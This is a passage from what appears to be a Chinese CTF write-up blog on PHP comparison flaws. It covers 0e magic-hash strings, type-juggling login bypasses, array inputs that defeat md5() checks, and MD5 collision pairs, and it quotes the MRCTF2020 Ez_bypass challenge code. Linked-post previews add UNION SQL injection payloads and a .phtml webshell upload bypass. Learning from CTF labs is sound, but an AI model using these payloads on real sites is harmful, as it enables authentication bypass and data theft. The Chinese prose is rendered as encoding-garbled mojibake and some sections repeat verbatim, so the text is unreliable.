<p>è¿˜æœ‰MD5å’ŒåŒMD5ä»¥åçš„å€¼éƒ½æ˜¯0eå¼€å¤´çš„</p>
<ul>
<li>CbDLytmyGm2xQyaLNhWn</li>
<li>770hQgrBOjrcqftrlaZk</li>
<li>7r4lGXCH2Ksu2JNT3BYM</li>
</ul>
<h3 id="2-å¼±æ¯”è¾ƒç»•è¿‡"><a href="#2-å¼±æ¯”è¾ƒç»•è¿‡" class="headerlink" title="2.å¼±æ¯”è¾ƒç»•è¿‡"></a>2.å¼±æ¯”è¾ƒç»•è¿‡</h3><h4 id="1-å­—ç¬¦ä¸²ä¸æ•°å­—æ¯”è¾ƒ"><a href="#1-å­—ç¬¦ä¸²ä¸æ•°å­—æ¯”è¾ƒ" class="headerlink" title="1.å­—ç¬¦ä¸²ä¸æ•°å­—æ¯”è¾ƒ"></a>1.å­—ç¬¦ä¸²ä¸æ•°å­—æ¯”è¾ƒ</h4><p>å½“ä¸€ä¸ª<strong>æ•°å­—</strong>å’Œä¸€ä¸ª<strong>å­—ç¬¦ä¸²</strong>ç”¨ <code>==</code> æ¯”è¾ƒæ—¶ï¼ŒPHP ä¼šå°è¯•æŠŠå­—ç¬¦ä¸²è½¬æˆæ•°å­—ã€‚</p>
<ul>
<li><strong>è§„åˆ™</strong>ï¼šPHP ä¼šä»å­—ç¬¦ä¸²çš„<strong>å¼€å¤´</strong>å¼€å§‹æ‰¾æ•°å­—ã€‚å¦‚æœå¼€å¤´æœ‰æ•°å­—ï¼Œå°±æˆªå–å‡ºæ¥ï¼›å¦‚æœå¼€å¤´æ²¡æ•°å­—ï¼Œå°±å½“åš <code>0</code>ã€‚</li>
<li><strong>ä¾‹å­</strong>ï¼š<ul>
<li><code>123 == &quot;123&quot;</code> â†’ <code>true</code>ï¼ˆå¾ˆæ­£å¸¸ï¼‰</li>
<li><code>123 == &quot;123admin&quot;</code> â†’ <code>true</code> ï¼ˆ<strong>å‘ï¼</strong> PHP æå–äº†å¼€å¤´çš„ <code>123</code>ï¼Œå¿½ç•¥äº†åé¢çš„å­—æ¯ï¼‰</li>
<li><code>0 == &quot;admin&quot;</code> â†’ <code>true</code> ï¼ˆ<strong>å¤§å‘ï¼</strong> å› ä¸º <code>admin</code> å¼€å¤´æ²¡æ•°å­—ï¼Œè¢«è½¬æˆäº† <code>0</code>ï¼‰</li>
</ul>
</li>
</ul>
<h4 id="2-å¸ƒå°”å€¼ï¼ˆTrue-Falseï¼‰"><a href="#2-å¸ƒå°”å€¼ï¼ˆTrue-Falseï¼‰" class="headerlink" title="2.å¸ƒå°”å€¼ï¼ˆTrue&#x2F;Falseï¼‰"></a>2.å¸ƒå°”å€¼ï¼ˆTrue&#x2F;Falseï¼‰</h4><p>è¿™æ˜¯æœ€å±é™©çš„ä¸€ç§ã€‚å¦‚æœæ¯”è¾ƒçš„ä¸€æ–¹æ˜¯ <code>true</code>ï¼ŒPHP ä¼šæŠŠå¦ä¸€æ–¹ä¹Ÿè½¬æˆå¸ƒå°”å€¼ã€‚</p>
<ul>
<li><strong>è§„åˆ™</strong>ï¼šé™¤äº† <code>0</code>ã€ç©ºå­—ç¬¦ä¸² <code>&quot;&quot;</code>ã€ç©ºæ•°ç»„ <code>[]</code>ã€<code>null</code> ä¹‹å¤–ï¼Œ<strong>å‡ ä¹æ‰€æœ‰çš„ä¸œè¥¿è½¬æˆå¸ƒå°”å€¼éƒ½æ˜¯ <code>true</code></strong>ã€‚</li>
<li><strong>ä¾‹å­</strong>ï¼š<ul>
<li><code>true == &quot;any_string&quot;</code> â†’ <code>true</code></li>
<li><code>true == 123</code> â†’ <code>true</code></li>
</ul>
</li>
<li><strong>åº”ç”¨åœºæ™¯</strong>ï¼šå¦‚æœåç«¯ä»£ç å†™çš„æ˜¯ <code>if($password == true)</code>ï¼Œä½ éšä¾¿è¾“å…¥ä»€ä¹ˆå­—ç¬¦ä¸²éƒ½èƒ½ç›´æ¥ç™»å½•ã€‚</li>
</ul>
<p>PHP çš„å¼±ç±»å‹æ¯”è¾ƒï¼ˆ<code>==</code>ï¼‰é‡Œçš„â€œå‘â€éå¸¸å¤šï¼Œé™¤äº†<strong>ç§‘å­¦è®¡æ•°æ³•ï¼ˆ0eï¼‰</strong>ï¼Œè¿˜æœ‰å¥½å‡ ç§è®©äººå“­ç¬‘ä¸å¾—çš„â€œè‡ªä½œèªæ˜â€ã€‚</p>
<p>åœ¨ PHP 8.0 ä¹‹å‰ï¼Œè¿™äº›è§„åˆ™éå¸¸æ··ä¹±ï¼Œä½†åœ¨ CTF æ¯”èµ›æˆ–æ—§ä»£ç å®¡è®¡ä¸­ï¼Œä½ ç»å¸¸ä¼šé‡åˆ°ä»¥ä¸‹å‡ ç§ç±»å‹ï¼š</p>
<h3 id="1-å­—ç¬¦ä¸²ä¸æ•°å­—æ¯”è¾ƒï¼ˆæœ€å¸¸è§çš„å‘ï¼‰"><a href="#1-å­—ç¬¦ä¸²ä¸æ•°å­—æ¯”è¾ƒï¼ˆæœ€å¸¸è§çš„å‘ï¼‰" class="headerlink" title="1. å­—ç¬¦ä¸²ä¸æ•°å­—æ¯”è¾ƒï¼ˆæœ€å¸¸è§çš„å‘ï¼‰"></a>1. å­—ç¬¦ä¸²ä¸æ•°å­—æ¯”è¾ƒï¼ˆæœ€å¸¸è§çš„å‘ï¼‰</h3><p>å½“ä¸€ä¸ª<strong>æ•°å­—</strong>å’Œä¸€ä¸ª<strong>å­—ç¬¦ä¸²</strong>ç”¨ <code>==</code> æ¯”è¾ƒæ—¶ï¼ŒPHP ä¼šå°è¯•æŠŠå­—ç¬¦ä¸²è½¬æˆæ•°å­—ã€‚</p>
<ul>
<li><strong>è§„åˆ™</strong>ï¼šPHP ä¼šä»å­—ç¬¦ä¸²çš„<strong>å¼€å¤´</strong>å¼€å§‹æ‰¾æ•°å­—ã€‚å¦‚æœå¼€å¤´æœ‰æ•°å­—ï¼Œå°±æˆªå–å‡ºæ¥ï¼›å¦‚æœå¼€å¤´æ²¡æ•°å­—ï¼Œå°±å½“åš <code>0</code>ã€‚</li>
<li><strong>ä¾‹å­</strong>ï¼š<ul>
<li><code>123 == &quot;123&quot;</code> â†’ <code>true</code>ï¼ˆå¾ˆæ­£å¸¸ï¼‰</li>
<li><code>123 == &quot;123admin&quot;</code> â†’ <code>true</code> ï¼ˆ<strong>å‘ï¼</strong> PHP æå–äº†å¼€å¤´çš„ <code>123</code>ï¼Œå¿½ç•¥äº†åé¢çš„å­—æ¯ï¼‰</li>
<li><code>0 == &quot;admin&quot;</code> â†’ <code>true</code> ï¼ˆ<strong>å¤§å‘ï¼</strong> å› ä¸º <code>admin</code> å¼€å¤´æ²¡æ•°å­—ï¼Œè¢«è½¬æˆäº† <code>0</code>ï¼‰</li>
</ul>
</li>
</ul>
<hr>
<h3 id="2-åå…­è¿›åˆ¶å­—ç¬¦ä¸²è½¬æ¢"><a href="#2-åå…­è¿›åˆ¶å­—ç¬¦ä¸²è½¬æ¢" class="headerlink" title="2. åå…­è¿›åˆ¶å­—ç¬¦ä¸²è½¬æ¢"></a>2. åå…­è¿›åˆ¶å­—ç¬¦ä¸²è½¬æ¢</h3><p>åœ¨æ—§ç‰ˆæœ¬çš„ PHPï¼ˆPHP 5ï¼‰ä¸­ï¼Œå¦‚æœå­—ç¬¦ä¸²çœ‹èµ·æ¥åƒåå…­è¿›åˆ¶ï¼ˆä»¥ <code>0x</code> å¼€å¤´ï¼‰ï¼Œæ¯”è¾ƒæ—¶ä¹Ÿä¼šè‡ªåŠ¨è½¬æˆåè¿›åˆ¶æ•°å­—ã€‚</p>
<ul>
<li><strong>ä¾‹å­</strong>ï¼š<code>&quot;0x1e&quot; == &quot;30&quot;</code> â†’ <code>true</code><ul>
<li>è§£æï¼š<code>0x1e</code> æ˜¯åå…­è¿›åˆ¶çš„ 30ï¼ŒPHP è‡ªåŠ¨å¸®ä½ åœ¨åå°è½¬å¥½äº†ã€‚</li>
<li><em>æ³¨ï¼šè¿™ç§ç‰¹æ€§åœ¨ PHP 7 ä¸­å·²è¢«ç§»é™¤ï¼Œä½†åœ¨è€é¢˜ç›®ä¸­ä¾ç„¶ä¼šå‡ºç°ã€‚</em></li>
</ul>
</li>
</ul>
<hr>
<h3 id="3-å¸ƒå°”å€¼ï¼ˆTrue-Falseï¼‰çš„â€œä¸‡èƒ½åŒ¹é…â€"><a href="#3-å¸ƒå°”å€¼ï¼ˆTrue-Falseï¼‰çš„â€œä¸‡èƒ½åŒ¹é…â€" class="headerlink" title="3. å¸ƒå°”å€¼ï¼ˆTrue&#x2F;Falseï¼‰çš„â€œä¸‡èƒ½åŒ¹é…â€"></a>3. å¸ƒå°”å€¼ï¼ˆTrue&#x2F;Falseï¼‰çš„â€œä¸‡èƒ½åŒ¹é…â€</h3><p>è¿™æ˜¯æœ€å±é™©çš„ä¸€ç§ã€‚å¦‚æœæ¯”è¾ƒçš„ä¸€æ–¹æ˜¯ <code>true</code>ï¼ŒPHP ä¼šæŠŠå¦ä¸€æ–¹ä¹Ÿè½¬æˆå¸ƒå°”å€¼ã€‚</p>
<ul>
<li><strong>è§„åˆ™</strong>ï¼šé™¤äº† <code>0</code>ã€ç©ºå­—ç¬¦ä¸² <code>&quot;&quot;</code>ã€ç©ºæ•°ç»„ <code>[]</code>ã€<code>null</code> ä¹‹å¤–ï¼Œ<strong>å‡ ä¹æ‰€æœ‰çš„ä¸œè¥¿è½¬æˆå¸ƒå°”å€¼éƒ½æ˜¯ <code>true</code></strong>ã€‚</li>
<li><strong>ä¾‹å­</strong>ï¼š<ul>
<li><code>true == &quot;any_string&quot;</code> â†’ <code>true</code></li>
<li><code>true == 123</code> â†’ <code>true</code></li>
</ul>
</li>
<li><strong>åº”ç”¨åœºæ™¯</strong>ï¼šå¦‚æœåç«¯ä»£ç å†™çš„æ˜¯ <code>if($password == true)</code>ï¼Œä½ éšä¾¿è¾“å…¥ä»€ä¹ˆå­—ç¬¦ä¸²éƒ½èƒ½ç›´æ¥ç™»å½•ã€‚</li>
</ul>
<h4 id="3-æ•°ç»„ï¼ˆArrayï¼‰çš„ç‰¹æ®Šå¤„ç†"><a href="#3-æ•°ç»„ï¼ˆArrayï¼‰çš„ç‰¹æ®Šå¤„ç†" class="headerlink" title="3. æ•°ç»„ï¼ˆArrayï¼‰çš„ç‰¹æ®Šå¤„ç†"></a>3. æ•°ç»„ï¼ˆArrayï¼‰çš„ç‰¹æ®Šå¤„ç†</h4><p>æ­£å¦‚æˆ‘ä¹‹å‰æåˆ°çš„ï¼Œæœ‰äº›å‡½æ•°ï¼ˆæ¯”å¦‚ <code>md5()</code>ï¼‰ä¸æ¥å—æ•°ç»„ã€‚</p>
<ul>
<li><strong>æƒ…å†µ</strong>ï¼šå¦‚æœä½ ç»™ <code>md5()</code> ä¼ ä¸€ä¸ªæ•°ç»„ï¼Œæ¯”å¦‚ <code>md5([])</code>ï¼ŒPHP ä¼šæŠ¥ä¸€ä¸ªè­¦å‘Šï¼Œå¹¶è¿”å› <strong><code>null</code></strong>ã€‚</li>
<li><strong>é€»è¾‘ç»•è¿‡</strong>ï¼š</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// å¦‚æœä»£ç æ˜¯è¿™æ ·ï¼š</span><br><span class="line">if (md5($a) == md5($b))</span><br></pre></td></tr></table></figure>

<p>ä½ ä¼ å…¥ <code>a[]=1&amp;b[]=2</code>ã€‚ è®¡ç®—ç»“æœå˜æˆï¼š<code>NULL == NULL</code> â†’ <strong>ç»“æœä¸º <code>true</code></strong>ã€‚ è¿™ç§æ–¹æ³•ä¸ä»…èƒ½ç»•è¿‡ç§‘å­¦è®¡æ•°æ³•çš„ <code>0e</code>ï¼Œç”šè‡³èƒ½ç»•è¿‡<strong>å¼ºç±»å‹æ¯”è¾ƒ <code>===</code></strong>ã€‚</p>
<h4 id="4-NULLã€0ã€ç©ºå­—ç¬¦ä¸²"><a href="#4-NULLã€0ã€ç©ºå­—ç¬¦ä¸²" class="headerlink" title="4. NULLã€0ã€ç©ºå­—ç¬¦ä¸²"></a>4. NULLã€0ã€ç©ºå­—ç¬¦ä¸²</h4><p>è¿™ä¸‰è€…åœ¨ <code>==</code> ä¸‹æ˜¯â€œä¸‰ä½ä¸€ä½“â€çš„ã€‚</p>
<ul>
<li><code>0 == &quot;&quot;</code> â†’ <code>true</code></li>
<li><code>0 == &quot;0&quot;</code> â†’ <code>true</code></li>
<li><code>0 == null</code> â†’ <code>true</code></li>
<li><code>false == &quot;&quot;</code> â†’ <code>true</code></li>
</ul>
<h4 id="5-ç§‘å­¦è®¡æ•°æ³•"><a href="#5-ç§‘å­¦è®¡æ•°æ³•" class="headerlink" title="5.ç§‘å­¦è®¡æ•°æ³•"></a>5.ç§‘å­¦è®¡æ•°æ³•</h4><p>å½“ PHP æ‰§è¡Œ <code>if (&quot;0e123&quot; == &quot;0e456&quot;)</code> æ—¶ï¼Œå®ƒçš„å¤§è„‘é‡Œå‘ç”Ÿäº†å¦‚ä¸‹å¯¹è¯ï¼š</p>
<ol>
<li><strong>PHP</strong>ï¼šâ€œå·¦è¾¹æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸² <code>0e123</code>ï¼Œå³è¾¹æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸² <code>0e456</code>ã€‚â€</li>
<li><strong>PHP</strong>ï¼šâ€œå’¦ï¼Ÿç­‰ç­‰ï¼Œè¿™ä¸¤ä½é•¿å¾—å¥½åƒç§‘å­¦è®¡æ•°æ³•å•Šï¼å·¦è¾¹ 0Ã—10 çš„ 123 æ¬¡æ–¹æ˜¯ 0ï¼Œå³è¾¹ 0Ã—10 çš„ 456 æ¬¡æ–¹ä¹Ÿæ˜¯ 0ã€‚â€</li>
<li><strong>PHP</strong>ï¼šâ€œæ—¢ç„¶å®ƒä»¬åœ¨æ•°å­¦ä¸Šéƒ½ç­‰äºæ•°å­— 0ï¼Œé‚£å®ƒä»¬è‚¯å®šå°±æ˜¯ç›¸ç­‰çš„å•¦ï¼â€</li>
<li><strong>ç»“æœ</strong>ï¼šè¿”å› <code>true</code>ã€‚</li>
</ol>
<p>3.å¼ºæ¯”è¾ƒç»•è¿‡</p>
<p>æ ¹æ®æœ‰æ— stringçœ‹ï¼Œæ˜¯å¦å¯ä»¥æ•°ç»„ç»•è¿‡</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_73818134/article/details/131793815">https://blog.csdn.net/m0_73818134/article/details/131793815</a></p>
<p>ä¾‹å­ï¼š</p>
<p>a&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</p>
<p>b&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</p>
<h2 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h2><h3 id="1-2"><a href="#1-2" class="headerlink" title="1"></a>1</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">I put something in F12 for you include &#x27;flag.php&#x27;;</span><br><span class="line">$flag=&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;;</span><br><span class="line">if(isset($_GET[&#x27;gg&#x27;])&amp;&amp;isset($_GET[&#x27;id&#x27;])) &#123;</span><br><span class="line">	$id=$_GET[&#x27;id&#x27;];</span><br><span class="line">	$gg=$_GET[&#x27;gg&#x27;];</span><br><span class="line">	if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;</span><br><span class="line">		echo &#x27;You got the first step&#x27;;</span><br><span class="line">		if(isset($_POST[&#x27;passwd&#x27;])) &#123;</span><br><span class="line">			$passwd=$_POST[&#x27;passwd&#x27;];</span><br><span class="line">			if (!is_numeric($passwd)) &#123;</span><br><span class="line">				if($passwd==1234567) &#123;</span><br><span class="line">					echo &#x27;Good Job!&#x27;;</span><br><span class="line">					highlight_file(&#x27;flag.php&#x27;);</span><br><span class="line">					die(&#x27;By Retr_0&#x27;);</span><br><span class="line">				&#125; else &#123;</span><br><span class="line">					echo &quot;can you think twice??&quot;;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125; else &#123;</span><br><span class="line">				echo &#x27;You can not get it !&#x27;;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			die(&#x27;only one way to get the flag&#x27;);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		echo &quot;You are not a real hacker!&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">	die(&#x27;Please input first&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">Please input first</span><br></pre></td></tr></table></figure>

</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>æ–‡ç« ä½œè€…: </span><span class="post-copyright-info"><a href="https://2829750658t-svg.github.io">qyt</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>æ–‡ç« é“¾æ¥: </span><span class="post-copyright-info"><a href="https://2829750658t-svg.github.io/2026/01/21/ctf%E9%A2%98%E8%A7%A3/web/Logic%20Flaw/">https://2829750658t-svg.github.io/2026/01/21/ctf%E9%A2%98%E8%A7%A3/web/Logic%20Flaw/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>ç‰ˆæƒå£°æ˜: </span><span class="post-copyright-info">æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜æ¥æº <a href="https://2829750658t-svg.github.io" target="_blank">24kmagic</a>ï¼</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/web-%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/">web-é€»è¾‘æ¼æ´</a></div><div class="post-share"><div class="social-share" data-image="/img/butterfly-icon.png" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i>èµåŠ©</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/images/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/images/wechat.jpg" alt="å¾®ä¿¡"/></a><div class="post-qr-code-desc">å¾®ä¿¡</div></li><li class="reward-item"><a href="/images/alipay.jpg" target="_blank"><img class="post-qr-code-img" src="/images/alipay.jpg" alt="æ”¯ä»˜å®"/></a><div class="post-qr-code-desc">æ”¯ä»˜å®</div></li></ul></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2026/01/21/ctf%E9%A2%98%E8%A7%A3/web/sqlzhuru/" title="web-sqlæ³¨å…¥"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">ä¸Šä¸€ç¯‡</div><div class="info-item-2">web-sqlæ³¨å…¥</div></div><div class="info-2"><div class="info-item-1">web-sqlæ³¨å…¥08 ç¬¬å…«ç«  å¤©è¡çœŸè¨€ï¼Œæ˜Ÿå›¾æ˜¾åœ£ é¢˜è§£1.åˆ¤æ–­å­—æ®µæ•°order by 2 2.åˆ¤æ–­å›æ˜¾ä½ â€˜union select  1,2# Welcome 1 3.æ•°æ®åº“å â€˜union select database()# Welcome user 4.å°è¯•æŸ¥è¯¢æ•°æ®åº“åä¸ºuserä¸‹çš„æ‰€æœ‰è¡¨å â€˜union select group_concat(table_name),2 from information_schema.tables where table_schema&#x3D;â€™userâ€™# Welcome flag,users 5.å°è¯•æŸ¥è¯¢ æ•°æ®åº“åä¸ºuserï¼Œè¡¨åä¸ºflag ä¸‹çš„æ‰€æœ‰åˆ—å â€˜union select group_concat(column_name),2 from information_schema.columns where table_schema&#x3D;â€™userâ€™ and table_name&#x3D;â€™flagâ€™# Welcome value 6.æŸ¥æ‰¾æ•°æ® é”™è¯¯ç­”æ¡ˆï¼šâ€™union select value,2 from flag...</div></div></div></a><a class="pagination-related" href="/2026/01/21/ctf%E9%A2%98%E8%A7%A3/web/fileuploadandcontain/" title="web-æ–‡ä»¶ä¸Šä¼ +åŒ…å«"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">ä¸‹ä¸€ç¯‡</div><div class="info-item-2">web-æ–‡ä»¶ä¸Šä¼ +åŒ…å«</div></div><div class="info-2"><div class="info-item-1">web-æ–‡ä»¶ä¸Šä¼ +åŒ…å«[ç¬¬äºŒç«  webè¿›é˜¶]æ–‡ä»¶ä¸Šä¼  1 æ–‡ä»¶ä¸Šä¼ æ¼æ´ é¢˜è§£1.ä¸Šä¼ webshell.jpgæ–‡ä»¶ 2.å‘ç°ä¸Šä¼ æˆåŠŸå´æ— æ³•æ‰“å¼€ æ˜¯å› ä¸ºä¸Šä¼ çš„ç›®å½•æ˜¯éšæœºçš„ï¼Œæ‰€ä»¥ç”¨å¾¡å‰‘æ‰«æå³å¯ï¼Œæ‰¾åˆ°å¯¹åº”ç½‘é¡µ æ‰“å¼€ [ACTF2020 æ–°ç”Ÿèµ›]Upload 1ååˆ†æ³¢æŠ˜çš„ä¸€é“é¢˜ç›®å“ˆ 1.æ–‡ä»¶ä¸Šä¼ phpï¼Œå¤±è´¥ï¼Œæ˜¾ç¤ºåªèƒ½jpgç­‰ä¸€å †æ­£å¸¸æ ¼å¼ 2.ä¸Šä¼ æœ¨é©¬jpgï¼Œæ”¹æˆphpï¼Œnonono 3.é‚£æ”¹æˆphtmlï¼Ÿé»‘åå•ç»•è¿‡ï¼Œå¯ä»¥ 4.èšå‰‘è¿æ¥å¾—åˆ°flag æ³¨æ„linuxç³»ç»ŸæŸ¥çœ‹å½“å‰ç›®å½•flagéœ€è¦ cat &#x2F;flag 1234561. ç›´æ¥ä¸Šä¼ .phpæ–‡ä»¶ â†’ å¤±è´¥ï¼ˆå‰ç«¯/åç«¯æ£€æµ‹åç¼€ï¼Œä»…å…è®¸jpg/pngç­‰å›¾ç‰‡æ ¼å¼ï¼‰ï¼›2. ä¸Šä¼ å›¾ç‰‡é©¬ï¼‰â†’ å°è¯•æŠ“åŒ…æ”¹å›.php â†’ æç¤ºnoï¼ˆåç«¯é»‘åå•æ‹¦æˆª.phpï¼‰ï¼›3. é»‘åå•ç»•è¿‡ï¼šæ”¹åç¼€ä¸º.phtmlï¼ˆApacheé»˜è®¤è§£æ.phtmlä¸ºPHPï¼‰â†’ ä¸Šä¼ æˆåŠŸï¼›    ç»†èŠ‚ï¼šContent-Typeä¸ºimage/jpegä¸æ”¹ï¼ˆç»•MIMEæ ¡éªŒï¼‰ï¼Œä»…æ”¹filenameä¸ºxxx.phtmlï¼›4. èšå‰‘è¿æ¥ï¼š5. æ‹¿flagï¼šLinuxç³»ç»Ÿä¸‹æ‰§è¡Œå‘½ä»¤ cat ...</div></div></div></a></nav><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> è¯„è®º</span></div></div><div class="comment-wrap"><div><div id="giscus-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">qyt</div><div class="author-info-description">ä¸è¦æ”¾å¼ƒè‡ªç”±å»é€‰æ‹©ä¿éšœï¼Œåˆ°å¤´æ¥ä½ ä¸¤è€…éƒ½å¾—ä¸åˆ°</div><div class="site-data"><a href="/archives/"><div class="headline">æ–‡ç« </div><div class="length-num">27</div></a><a href="/tags/"><div class="headline">æ ‡ç­¾</div><div class="length-num">25</div></a><a href="/categories/"><div class="headline">åˆ†ç±»</div><div class="length-num">15</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/2829750658t-svg" target="_blank" title="GitHub"><i class="fab fa-github"></i></a><a class="social-icon" href="https://www.zhihu.com/people/7e5acf574f89c3cba9460c739673e2cf" target="_blank" title="çŸ¥ä¹"><i class="fab fa-zhihu"></i></a><a class="social-icon" href="https://xhslink.com/m/2t0Ndc1uvYL" target="_blank" title="å°çº¢ä¹¦"><i class="fas fa-notes-medical"></i></a><a class="social-icon" href="https://163cn.tv/Z9ohElT" target="_blank" title="ç½‘æ˜“äº‘éŸ³ä¹"><i class="fas fa-music"></i></a><a class="social-icon" href="https://www.instagram.com/tenyeahqweyeah?igsh=NG92enl2NTE0NGMx&amp;utm_source=qr" target="_blank" title="Instagram"><i class="fab fa-instagram"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>å…¬å‘Š</span></div><div class="announcement_content">å¾ˆé«˜å…´èƒ½å‘ä½ å±•ç¤ºæˆ‘çš„åšå®¢</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>ç›®å½•</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web-%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">web-é€»è¾‘æ¼æ´</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#19-%E7%AC%AC%E5%8D%81%E4%B9%9D%E7%AB%A0-revenge"><span class="toc-number">2.</span> <span class="toc-text">19 ç¬¬åä¹ç« _revenge</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83%E6%80%9D%E8%B7%AF"><span class="toc-number">2.1.</span> <span class="toc-text">æ ¸å¿ƒæ€è·¯</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">2.2.</span> <span class="toc-text"></span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mini-l-ctf-web-Clickclick"><span class="toc-number">3.</span> <span class="toc-text">mini-l ctf web Clickclick</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GuessOneGuess"><span class="toc-number">4.</span> <span class="toc-text">GuessOneGuess</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME"><span class="toc-number">5.</span> <span class="toc-text">[æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1"><span class="toc-number">5.1.</span> <span class="toc-text">1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%9D%83%E9%99%90%E9%99%90%E5%88%B6-Permission-Denied-%E2%80%94%E2%80%94-%E6%9C%80%E5%8F%AF%E8%83%BD%E7%9A%84%E5%8E%9F%E5%9B%A0"><span class="toc-number">5.2.</span> <span class="toc-text">1. æƒé™é™åˆ¶ (Permission Denied) â€”â€” æœ€å¯èƒ½çš„åŸå› </span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%87%BD%E6%95%B0%E8%A2%AB%E7%A6%81%E7%94%A8-Disable-Functions-%E2%80%94%E2%80%94-%E7%BB%95%E8%BF%87%E9%99%90%E5%88%B6"><span class="toc-number">5.3.</span> <span class="toc-text">2. å‡½æ•°è¢«ç¦ç”¨ (Disable Functions) â€”â€” ç»•è¿‡é™åˆ¶</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%AE%83%E7%9A%84%E5%8E%9F%E7%90%86%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F%EF%BC%88SUID-%E6%9D%83%E9%99%90%EF%BC%89"><span class="toc-number">5.4.</span> <span class="toc-text">1. 